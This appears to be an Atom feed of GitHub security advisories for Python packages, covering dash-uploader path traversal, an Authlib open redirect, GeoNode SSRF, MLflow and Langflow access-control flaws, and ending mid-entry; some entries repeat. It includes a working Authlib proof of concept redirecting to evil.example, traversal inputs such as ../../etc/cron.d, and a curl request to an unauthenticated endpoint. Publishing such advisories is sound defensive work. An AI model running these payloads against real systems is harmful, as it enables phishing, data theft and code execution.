<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-06-08T18:09:06.239Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[dash-uploader] dash-uploader has a directory traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-3rf6-x59v-5jfv</id>
        <link href="https://github.com/advisories/GHSA-3rf6-x59v-5jfv"/>
        <updated>2026-06-08T17:52:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An unauthenticated path traversal vulnerability exists in <a href="https://pypi.org/project/dash-uploader/">dash-uploader</a> versions 0.1.0 through 0.7.0a2. The library's HTTP request handler at <code>dash_uploader/httprequesthandler.py</code> reads three form parameters (<code>upload_id</code>, <code>resumableFilename</code>, <code>resumableIdentifier</code>) from <code>request.form.get()</code> and passes them directly to <code>os.path.join()</code> and <code>os.makedirs()</code> without any sanitization.</p>
<p>A single unauthenticated <code>POST /API/dash-uploader</code> request with <code>upload_id</code> set to a relative path (e.g. <code>../../etc/cron.d</code> or <code>../venv/lib/python3.13/site-packages</code>) escapes the application's <code>uploads/</code> directory and writes the supplied file content to the chosen target path under the privilege of the gunicorn / WSGI process.</p>
<p>When the chosen target is a Python <code>site-packages</code> directory and the dropped file is a <code>.pth</code> file containing an <code>import</code>-prefixed line, Python's <code>site</code> module executes that line on the next interpreter startup, yielding remote code execution. Other escalation paths reachable from the same primitive include overwriting the running WSGI module, dropping <code>~/.ssh/authorized_keys</code>, or writing JavaScript into a Dash-served <code>assets/</code> directory for stored XSS.</p>
<h3 id="affected-versions">Affected versions</h3>
<p>All 16 published PyPI releases (<code>0.1.0</code> through <code>0.7.0a2</code>) are affected. The package repository was archived on 2025-07-19; <strong>no patched version exists</strong>.</p>
<h3 id="mitigation">Mitigation</h3>
<p>Replace <code>dash-uploader</code> with an alternative file-upload component (for example, <code>dash-resumable-upload</code>, server-rendered <code>&lt;input type=\"file\"&gt;</code> plus a hardened Flask endpoint, or a maintained Dash community alternative). There is no upstream fix path.</p>
<p>While a replacement is being deployed, mitigations include:</p>
<ul>
<li>Block <code>POST /API/dash-uploader</code> at an upstream proxy, OR</li>
<li>Run the application as an unprivileged user with no write access to its own <code>site-packages</code>, OR</li>
<li>Use a read-only filesystem for the application's code directories.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-38360">https://nvd.nist.gov/vuln/detail/CVE-2026-38360</a></li>
<li><a href="https://github.com/fohrloop/dash-uploader/issues/153">https://github.com/fohrloop/dash-uploader/issues/153</a></li>
<li><a href="https://github.com/a1ohadance/CVE-2026-38360">https://github.com/a1ohadance/CVE-2026-38360</a></li>
<li><a href="https://github.com/fohrloop/dash-uploader">https://github.com/fohrloop/dash-uploader</a></li>
<li><a href="https://github.com/fohrloop/dash-uploader/blob/dev/dash_uploader/httprequesthandler.py">https://github.com/fohrloop/dash-uploader/blob/dev/dash_uploader/httprequesthandler.py</a></li>
<li><a href="https://github.com/fohrloop/dash-uploader/blob/stable/dash_uploader/httprequesthandler.py">https://github.com/fohrloop/dash-uploader/blob/stable/dash_uploader/httprequesthandler.py</a></li>
<li><a href="https://pypi.org/project/dash-uploader">https://pypi.org/project/dash-uploader</a></li>
<li><a href="https://github.com/advisories/GHSA-3rf6-x59v-5jfv">https://github.com/advisories/GHSA-3rf6-x59v-5jfv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3rf6-x59v-5jfv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-08T18:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[authlib] Authlib OAuth 2.0 has Open Redirect in Authorization API that allows attacker-controlled redirect_uri through unsupported response_type]]></title>
        <id>https://github.com/advisories/GHSA-w8p2-r796-3vmq</id>
        <link href="https://github.com/advisories/GHSA-w8p2-r796-3vmq"/>
        <updated>2026-06-08T17:52:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Authlib's OAuth 2.0 authorization endpoint can be turned into an unauthenticated open redirect when a request uses an unsupported response_type and supplies an attacker-controlled redirect_uri.</p>
<p>The vulnerable behavior happens before client lookup and before any redirect URI validation. As a result, an attacker does not need a valid client registration, an authenticated user, or any prior state. A single request to the authorization endpoint is enough to obtain a 302 Location response to an arbitrary attacker-controlled URL.</p>
<p>It was confirmed that the vulnerable code is present in tag v1.6.6 and in the current HEAD under test (68e6ab3fdfc71a328b1966bad5c6aba0f7d0c2e1, git describe: v1.6.6-104-g68e6ab3f). The issue was dynamically reproduced locally on the current HEAD.</p>
<h3 id="details">Details</h3>
<p>The root cause is that <code>AuthorizationServer.get_authorization_grant()</code> copies the raw request
  <code>redirect_uri</code> into an <code>UnsupportedResponseTypeError</code> before any client has been resolved and
  before any redirect URI validation has happened:</p>
<pre><code class="language-python"># authlib/oauth2/rfc6749/authorization_server.py
raise UnsupportedResponseTypeError(
    f"The response type '{request.payload.response_type}' is not supported by the server.",
    request.payload.response_type,
    redirect_uri=request.payload.redirect_uri,
)

That error object is later rendered by OAuth2Error.__call__(). If redirect_uri is set, Authlib
automatically returns a redirect response to that URI:

# authlib/oauth2/base.py
def __call__(self, uri=None):
    if self.redirect_uri:
        params = self.get_body()
        loc = add_params_to_uri(self.redirect_uri, params, self.redirect_fragment)
        return 302, "", [("Location", loc)]
    return super().__call__(uri=uri)

This means an unsupported response_type request can force the authorization server to redirect
to an attacker-controlled URL even when:

1. no valid client exists,
2. no grant matched the request,
3. no registered redirect_uri was ever checked.

This is not a contrived code path. It is reachable through the normal Authlib authorization
endpoint flow documented for Flask and Django integrations, where applications are told to call
server.get_consent_grant(...) and then server.handle_error_response(...) on OAuth2Error.

Relevant source and documentation references:

- authlib/oauth2/rfc6749/authorization_server.py
- authlib/oauth2/base.py
- docs/flask/2/authorization-server.rst
- docs/django/2/authorization-server.rst

### PoC

Local test environment:

- Repository checkout: 68e6ab3fdfc71a328b1966bad5c6aba0f7d0c2e1
- git describe: v1.6.6-104-g68e6ab3f
- Python virtualenv: ./.venv
- Environment variable: AUTHLIB_INSECURE_TRANSPORT=true

Note: AUTHLIB_INSECURE_TRANSPORT=true was only used to allow local loopback HTTP reproduction.
It does not create the vulnerable behavior. In a real deployment the same logic is reachable
over HTTPS.

Run this exact PoC from the repository root:

export AUTHLIB_INSECURE_TRANSPORT=true
./.venv/bin/python - &lt;&lt;'PY'
import os, json
from flask import Flask, request
from authlib.integrations.flask_oauth2 import AuthorizationServer
from authlib.oauth2 import OAuth2Error
from authlib.oauth2.rfc6749.grants import AuthorizationCodeGrant as _AuthorizationCodeGrant

os.environ["AUTHLIB_INSECURE_TRANSPORT"] = "true"

class AuthorizationCodeGrant(_AuthorizationCodeGrant):
    def save_authorization_code(self, code, request):
        raise RuntimeError("not reached")
    def query_authorization_code(self, code, client):
        return None
    def delete_authorization_code(self, authorization_code):
        pass
    def authenticate_user(self, authorization_code):
        return None

app = Flask(__name__)
app.secret_key = "testing"

server = AuthorizationServer(
    app,
    query_client=lambda client_id: None,
    save_token=lambda token, request: None,
)
server.register_grant(AuthorizationCodeGrant)

@app.route("/oauth/authorize", methods=["GET", "POST"])
def authorize():
    try:
        grant = server.get_consent_grant(end_user=None)
    except OAuth2Error as error:
        return server.handle_error_response(request, error)
    return server.create_authorization_response(grant=grant, grant_user=None)

with app.test_client() as c:
    cases = {
        "without_redirect_uri": "/oauth/authorize?response_type=totally-unsupported&amp;state=s1",
        "with_attacker_redirect_uri": "/oauth/authorize?response_type=totally-
unsupported&amp;redirect_uri=https%3A%2F%2Fevil.example%2Flanding&amp;state=s1",
    }
    out = {}
    for name, url in cases.items():
        r = c.get(url)
        out[name] = {
            "status": r.status_code,
            "location": r.headers.get("Location"),
            "body": r.get_data(as_text=True),
        }
    print(json.dumps(out, indent=2))
PY

Observed result:

{
  "without_redirect_uri": {
    "status": 400,
    "location": null,
    "body": "{\"error\": \"unsupported_response_type\", \"error_description\": \"totally-
unsupported\", \"state\": \"s1\"}"
  },
  "with_attacker_redirect_uri": {
    "status": 302,
    "location":
"https://evil.example/landing?error=unsupported_response_type&amp;error_description=totally-unsupported&amp;state=s1",                                                                                    
    "body": ""
  }
}

This demonstrates that the only difference between a local error and an external redirect is
whether the attacker supplies redirect_uri.

The same behavior was locally reproduced with the Django integration using RequestFactory; it
returned:

{
  "status": 302,
  "location":
"https://evil.example/landing?error=unsupported_response_type&amp;error_description=totally-unsupported&amp;state=s1",                                                                                    
  "body": ""
}

### Impact
This is an unauthenticated open redirect in an internet-facing authorization endpoint.

Who is impacted:

- Any deployment using Authlib's OAuth 2.0 authorization server and the documented authorization
  endpoint flow.
- No special feature flag is required beyond running the authorization endpoint itself.

Attacker prerequisites:

- None beyond the ability to send a victim to a crafted authorization URL.

Practical harm:

- Phishing and credential theft by abusing a trusted authorization server domain as a
  redirector.
- Bypass of domain-based allowlists that trust the authorization server's host.
- SSO / OAuth confusion in ecosystems where trusted authorization endpoints are expected to
  reject unregistered redirect URIs before redirecting.

The issue is especially concerning because the redirect happens before client existence and
redirect URI legitimacy are established.
### References

- &lt;https://github.com/authlib/authlib/security/advisories/GHSA-w8p2-r796-3vmq&gt;
- &lt;https://github.com/authlib/authlib/commit/3be08468201a7766a93012ce149ea12822cab096&gt;
- &lt;https://github.com/advisories/GHSA-w8p2-r796-3vmq&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w8p2-r796-3vmq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-08T17:52:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[authlib] Authlib OAuth 2.0 has Open Redirect in Authorization API that allows attacker-controlled redirect_uri through unsupported response_type]]></title>
        <id>https://github.com/advisories/GHSA-w8p2-r796-3vmq</id>
        <link href="https://github.com/advisories/GHSA-w8p2-r796-3vmq"/>
        <updated>2026-06-08T17:52:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Authlib's OAuth 2.0 authorization endpoint can be turned into an unauthenticated open redirect when a request uses an unsupported response_type and supplies an attacker-controlled redirect_uri.</p>
<p>The vulnerable behavior happens before client lookup and before any redirect URI validation. As a result, an attacker does not need a valid client registration, an authenticated user, or any prior state. A single request to the authorization endpoint is enough to obtain a 302 Location response to an arbitrary attacker-controlled URL.</p>
<p>It was confirmed that the vulnerable code is present in tag v1.6.6 and in the current HEAD under test (68e6ab3fdfc71a328b1966bad5c6aba0f7d0c2e1, git describe: v1.6.6-104-g68e6ab3f). The issue was dynamically reproduced locally on the current HEAD.</p>
<h3 id="details">Details</h3>
<p>The root cause is that <code>AuthorizationServer.get_authorization_grant()</code> copies the raw request
  <code>redirect_uri</code> into an <code>UnsupportedResponseTypeError</code> before any client has been resolved and
  before any redirect URI validation has happened:</p>
<pre><code class="language-python"># authlib/oauth2/rfc6749/authorization_server.py
raise UnsupportedResponseTypeError(
    f"The response type '{request.payload.response_type}' is not supported by the server.",
    request.payload.response_type,
    redirect_uri=request.payload.redirect_uri,
)

That error object is later rendered by OAuth2Error.__call__(). If redirect_uri is set, Authlib
automatically returns a redirect response to that URI:

# authlib/oauth2/base.py
def __call__(self, uri=None):
    if self.redirect_uri:
        params = self.get_body()
        loc = add_params_to_uri(self.redirect_uri, params, self.redirect_fragment)
        return 302, "", [("Location", loc)]
    return super().__call__(uri=uri)

This means an unsupported response_type request can force the authorization server to redirect
to an attacker-controlled URL even when:

1. no valid client exists,
2. no grant matched the request,
3. no registered redirect_uri was ever checked.

This is not a contrived code path. It is reachable through the normal Authlib authorization
endpoint flow documented for Flask and Django integrations, where applications are told to call
server.get_consent_grant(...) and then server.handle_error_response(...) on OAuth2Error.

Relevant source and documentation references:

- authlib/oauth2/rfc6749/authorization_server.py
- authlib/oauth2/base.py
- docs/flask/2/authorization-server.rst
- docs/django/2/authorization-server.rst

### PoC

Local test environment:

- Repository checkout: 68e6ab3fdfc71a328b1966bad5c6aba0f7d0c2e1
- git describe: v1.6.6-104-g68e6ab3f
- Python virtualenv: ./.venv
- Environment variable: AUTHLIB_INSECURE_TRANSPORT=true

Note: AUTHLIB_INSECURE_TRANSPORT=true was only used to allow local loopback HTTP reproduction.
It does not create the vulnerable behavior. In a real deployment the same logic is reachable
over HTTPS.

Run this exact PoC from the repository root:

export AUTHLIB_INSECURE_TRANSPORT=true
./.venv/bin/python - &lt;&lt;'PY'
import os, json
from flask import Flask, request
from authlib.integrations.flask_oauth2 import AuthorizationServer
from authlib.oauth2 import OAuth2Error
from authlib.oauth2.rfc6749.grants import AuthorizationCodeGrant as _AuthorizationCodeGrant

os.environ["AUTHLIB_INSECURE_TRANSPORT"] = "true"

class AuthorizationCodeGrant(_AuthorizationCodeGrant):
    def save_authorization_code(self, code, request):
        raise RuntimeError("not reached")
    def query_authorization_code(self, code, client):
        return None
    def delete_authorization_code(self, authorization_code):
        pass
    def authenticate_user(self, authorization_code):
        return None

app = Flask(__name__)
app.secret_key = "testing"

server = AuthorizationServer(
    app,
    query_client=lambda client_id: None,
    save_token=lambda token, request: None,
)
server.register_grant(AuthorizationCodeGrant)

@app.route("/oauth/authorize", methods=["GET", "POST"])
def authorize():
    try:
        grant = server.get_consent_grant(end_user=None)
    except OAuth2Error as error:
        return server.handle_error_response(request, error)
    return server.create_authorization_response(grant=grant, grant_user=None)

with app.test_client() as c:
    cases = {
        "without_redirect_uri": "/oauth/authorize?response_type=totally-unsupported&amp;state=s1",
        "with_attacker_redirect_uri": "/oauth/authorize?response_type=totally-
unsupported&amp;redirect_uri=https%3A%2F%2Fevil.example%2Flanding&amp;state=s1",
    }
    out = {}
    for name, url in cases.items():
        r = c.get(url)
        out[name] = {
            "status": r.status_code,
            "location": r.headers.get("Location"),
            "body": r.get_data(as_text=True),
        }
    print(json.dumps(out, indent=2))
PY

Observed result:

{
  "without_redirect_uri": {
    "status": 400,
    "location": null,
    "body": "{\"error\": \"unsupported_response_type\", \"error_description\": \"totally-
unsupported\", \"state\": \"s1\"}"
  },
  "with_attacker_redirect_uri": {
    "status": 302,
    "location":
"https://evil.example/landing?error=unsupported_response_type&amp;error_description=totally-unsupported&amp;state=s1",                                                                                    
    "body": ""
  }
}

This demonstrates that the only difference between a local error and an external redirect is
whether the attacker supplies redirect_uri.

The same behavior was locally reproduced with the Django integration using RequestFactory; it
returned:

{
  "status": 302,
  "location":
"https://evil.example/landing?error=unsupported_response_type&amp;error_description=totally-unsupported&amp;state=s1",                                                                                    
  "body": ""
}

### Impact
This is an unauthenticated open redirect in an internet-facing authorization endpoint.

Who is impacted:

- Any deployment using Authlib's OAuth 2.0 authorization server and the documented authorization
  endpoint flow.
- No special feature flag is required beyond running the authorization endpoint itself.

Attacker prerequisites:

- None beyond the ability to send a victim to a crafted authorization URL.

Practical harm:

- Phishing and credential theft by abusing a trusted authorization server domain as a
  redirector.
- Bypass of domain-based allowlists that trust the authorization server's host.
- SSO / OAuth confusion in ecosystems where trusted authorization endpoints are expected to
  reject unregistered redirect URIs before redirecting.

The issue is especially concerning because the redirect happens before client existence and
redirect URI legitimacy are established.
### References

- &lt;https://github.com/authlib/authlib/security/advisories/GHSA-w8p2-r796-3vmq&gt;
- &lt;https://github.com/authlib/authlib/commit/3be08468201a7766a93012ce149ea12822cab096&gt;
- &lt;https://github.com/advisories/GHSA-w8p2-r796-3vmq&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w8p2-r796-3vmq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-08T17:52:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[geonode] GeoNode contains a server-side request forgery vulnerability in the service registration endpoint]]></title>
        <id>https://github.com/advisories/GHSA-hw9r-6m78-w6h3</id>
        <link href="https://github.com/advisories/GHSA-hw9r-6m78-w6h3"/>
        <updated>2026-06-08T12:51:33.000Z</updated>
        <content type="html"><![CDATA[<p>GeoNode versions 4.4.5 and 5.0.2 (and prior within their respective releases) contain a server-side request forgery vulnerability in the service registration endpoint that allows authenticated attackers to trigger outbound network requests to arbitrary URLs by submitting a crafted service URL during form validation. Attackers can probe internal network targets including loopback addresses, RFC1918 private IP ranges, link-local addresses, and cloud metadata services by exploiting insufficient URL validation in the WMS service handler without private IP filtering or allowlist enforcement.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39922">https://nvd.nist.gov/vuln/detail/CVE-2026-39922</a></li>
<li><a href="https://github.com/GeoNode/geonode/releases/tag/4.4.5">https://github.com/GeoNode/geonode/releases/tag/4.4.5</a></li>
<li><a href="https://github.com/GeoNode/geonode/releases/tag/5.0.2">https://github.com/GeoNode/geonode/releases/tag/5.0.2</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/geonode/PYSEC-2026-61.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/geonode/PYSEC-2026-61.yaml</a></li>
<li><a href="https://www.vulncheck.com/advisories/geonode-ssrf-via-service-registration">https://www.vulncheck.com/advisories/geonode-ssrf-via-service-registration</a></li>
<li><a href="https://github.com/advisories/GHSA-hw9r-6m78-w6h3">https://github.com/advisories/GHSA-hw9r-6m78-w6h3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hw9r-6m78-w6h3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-08T12:51:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[geonode] GeoNode contains a server-side request forgery vulnerability in the service registration endpoint]]></title>
        <id>https://github.com/advisories/GHSA-hw9r-6m78-w6h3</id>
        <link href="https://github.com/advisories/GHSA-hw9r-6m78-w6h3"/>
        <updated>2026-06-08T12:51:33.000Z</updated>
        <content type="html"><![CDATA[<p>GeoNode versions 4.4.5 and 5.0.2 (and prior within their respective releases) contain a server-side request forgery vulnerability in the service registration endpoint that allows authenticated attackers to trigger outbound network requests to arbitrary URLs by submitting a crafted service URL during form validation. Attackers can probe internal network targets including loopback addresses, RFC1918 private IP ranges, link-local addresses, and cloud metadata services by exploiting insufficient URL validation in the WMS service handler without private IP filtering or allowlist enforcement.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39922">https://nvd.nist.gov/vuln/detail/CVE-2026-39922</a></li>
<li><a href="https://github.com/GeoNode/geonode/releases/tag/4.4.5">https://github.com/GeoNode/geonode/releases/tag/4.4.5</a></li>
<li><a href="https://github.com/GeoNode/geonode/releases/tag/5.0.2">https://github.com/GeoNode/geonode/releases/tag/5.0.2</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/geonode/PYSEC-2026-61.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/geonode/PYSEC-2026-61.yaml</a></li>
<li><a href="https://www.vulncheck.com/advisories/geonode-ssrf-via-service-registration">https://www.vulncheck.com/advisories/geonode-ssrf-via-service-registration</a></li>
<li><a href="https://github.com/advisories/GHSA-hw9r-6m78-w6h3">https://github.com/advisories/GHSA-hw9r-6m78-w6h3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hw9r-6m78-w6h3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-08T12:51:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[geonode] Duplicate Advisory: GeoNode contains a server-side request forgery vulnerability in the service registration endpoint]]></title>
        <id>https://github.com/advisories/GHSA-v8f7-cg9p-w5jx</id>
        <link href="https://github.com/advisories/GHSA-v8f7-cg9p-w5jx"/>
        <updated>2026-06-08T12:50:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-hw9r-6m78-w6h3. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>GeoNode versions 4.0 before 4.4.5 and 5.0 before 5.0.2 contain a server-side request forgery vulnerability in the service registration endpoint that allows authenticated attackers to trigger outbound network requests to arbitrary URLs by submitting a crafted service URL during form validation. Attackers can probe internal network targets including loopback addresses, RFC1918 private IP ranges, link-local addresses, and cloud metadata services by exploiting insufficient URL validation in the WMS service handler without private IP filtering or allowlist enforcement.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39922">https://nvd.nist.gov/vuln/detail/CVE-2026-39922</a></li>
<li><a href="https://github.com/GeoNode/geonode/releases/tag/4.4.5">https://github.com/GeoNode/geonode/releases/tag/4.4.5</a></li>
<li><a href="https://github.com/GeoNode/geonode/releases/tag/5.0.2">https://github.com/GeoNode/geonode/releases/tag/5.0.2</a></li>
<li><a href="https://www.vulncheck.com/advisories/geonode-ssrf-via-service-registration">https://www.vulncheck.com/advisories/geonode-ssrf-via-service-registration</a></li>
<li><a href="https://github.com/GeoNode/geonode/security/advisories/GHSA-hw9r-6m78-w6h3">https://github.com/GeoNode/geonode/security/advisories/GHSA-hw9r-6m78-w6h3</a></li>
<li><a href="https://github.com/advisories/GHSA-v8f7-cg9p-w5jx">https://github.com/advisories/GHSA-v8f7-cg9p-w5jx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8f7-cg9p-w5jx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-10T21:31:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[geonode] Duplicate Advisory: GeoNode contains a server-side request forgery vulnerability in the service registration endpoint]]></title>
        <id>https://github.com/advisories/GHSA-v8f7-cg9p-w5jx</id>
        <link href="https://github.com/advisories/GHSA-v8f7-cg9p-w5jx"/>
        <updated>2026-06-08T12:50:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-hw9r-6m78-w6h3. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>GeoNode versions 4.0 before 4.4.5 and 5.0 before 5.0.2 contain a server-side request forgery vulnerability in the service registration endpoint that allows authenticated attackers to trigger outbound network requests to arbitrary URLs by submitting a crafted service URL during form validation. Attackers can probe internal network targets including loopback addresses, RFC1918 private IP ranges, link-local addresses, and cloud metadata services by exploiting insufficient URL validation in the WMS service handler without private IP filtering or allowlist enforcement.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39922">https://nvd.nist.gov/vuln/detail/CVE-2026-39922</a></li>
<li><a href="https://github.com/GeoNode/geonode/releases/tag/4.4.5">https://github.com/GeoNode/geonode/releases/tag/4.4.5</a></li>
<li><a href="https://github.com/GeoNode/geonode/releases/tag/5.0.2">https://github.com/GeoNode/geonode/releases/tag/5.0.2</a></li>
<li><a href="https://www.vulncheck.com/advisories/geonode-ssrf-via-service-registration">https://www.vulncheck.com/advisories/geonode-ssrf-via-service-registration</a></li>
<li><a href="https://github.com/GeoNode/geonode/security/advisories/GHSA-hw9r-6m78-w6h3">https://github.com/GeoNode/geonode/security/advisories/GHSA-hw9r-6m78-w6h3</a></li>
<li><a href="https://github.com/advisories/GHSA-v8f7-cg9p-w5jx">https://github.com/advisories/GHSA-v8f7-cg9p-w5jx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8f7-cg9p-w5jx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-10T21:31:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLflow is vulnerable to an authorization bypass affecting the AJAX endpoint]]></title>
        <id>https://github.com/advisories/GHSA-46r5-x6jq-v8g6</id>
        <link href="https://github.com/advisories/GHSA-46r5-x6jq-v8g6"/>
        <updated>2026-06-06T00:57:59.000Z</updated>
        <content type="html"><![CDATA[<p>MLflow is vulnerable to an authorization bypass affecting the AJAX endpoint used to download saved model artifacts. Due to missing access‑control validation, a user without permissions to a given experiment can directly query this endpoint and retrieve model artifacts they are not authorized to access.</p>
<p>This issue affects MLflow version through 3.10.1</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33866">https://nvd.nist.gov/vuln/detail/CVE-2026-33866</a></li>
<li><a href="https://github.com/mlflow/mlflow/pull/21708">https://github.com/mlflow/mlflow/pull/21708</a></li>
<li><a href="https://cert.pl/en/posts/2026/04/CVE-2026-33865">https://cert.pl/en/posts/2026/04/CVE-2026-33865</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/005b959cacda05d1423356cfcbd9ebeda8ff96a7">https://github.com/mlflow/mlflow/commit/005b959cacda05d1423356cfcbd9ebeda8ff96a7</a></li>
<li><a href="https://afine.com/blogs/attacking-mlflow-how-ml-artifacts-become-attack-vectors">https://afine.com/blogs/attacking-mlflow-how-ml-artifacts-become-attack-vectors</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mlflow/PYSEC-2026-94.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mlflow/PYSEC-2026-94.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-46r5-x6jq-v8g6">https://github.com/advisories/GHSA-46r5-x6jq-v8g6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-46r5-x6jq-v8g6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-07T15:30:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] langflow has Unauthenticated IDOR on Image Downloads]]></title>
        <id>https://github.com/advisories/GHSA-7grx-3xcx-2xv5</id>
        <link href="https://github.com/advisories/GHSA-7grx-3xcx-2xv5"/>
        <updated>2026-06-06T00:56:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>/api/v1/files/images/{flow_id}/{file_name}</code> endpoint serves image files without any authentication or ownership check. Any unauthenticated request with a known flow_id and file_name returns the image with HTTP 200.</p>
<h3 id="details">Details</h3>
<p><code>src/backend/base/langflow/api/v1/files.py:138-164</code> — <code>download_image</code> takes <code>flow_id</code>: UUID as a bare path parameter with no Depends(get_flow) or <code>CurrentActiveUser</code>. All other file routes (<code>download_file</code>, <code>upload_file</code>, <code>list_files</code>, <code>delete_file</code>) use <code>Depends(get_flow)</code> which enforces both authentication and ownership. There is no global auth middleware on /api/v1; protection is per-endpoint only.</p>
<h3 id="poc">PoC</h3>
<pre><code>curl -v "http://localhost:7860/api/v1/files/images/&lt;flow_uuid&gt;/&lt;filename.png&gt;"
# Returns HTTP 200 with image bytes, no auth header required
</code></pre>
<h3 id="impact">Impact</h3>
<p>Unauthenticated cross-tenant data leak. In a multi-tenant deployment, any attacker who can discover or guess a <code>flow_id</code> (UUIDs can be leaked through other API responses) can download any user's uploaded images without credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-7grx-3xcx-2xv5">https://github.com/langflow-ai/langflow/security/advisories/GHSA-7grx-3xcx-2xv5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33484">https://nvd.nist.gov/vuln/detail/CVE-2026-33484</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2026-80.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2026-80.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-7grx-3xcx-2xv5">https://github.com/advisories/GHSA-7grx-3xcx-2xv5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7grx-3xcx-2xv5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-20T20:47:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow has an Arbitrary File Write (RCE) via v2 API]]></title>
        <id>https://github.com/advisories/GHSA-g2j9-7rj2-gm6c</id>
        <link href="https://github.com/advisories/GHSA-g2j9-7rj2-gm6c"/>
        <updated>2026-06-06T00:55:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>While reviewing the recent patch for <strong>CVE-2025-68478</strong> (External Control of File Name in v1.7.1), I discovered that the root architectural issue within <code>LocalStorageService</code> remains unresolved. Because the underlying storage layer lacks boundary containment checks, the system relies entirely on the HTTP-layer <code>ValidatedFileName</code> dependency.</p>
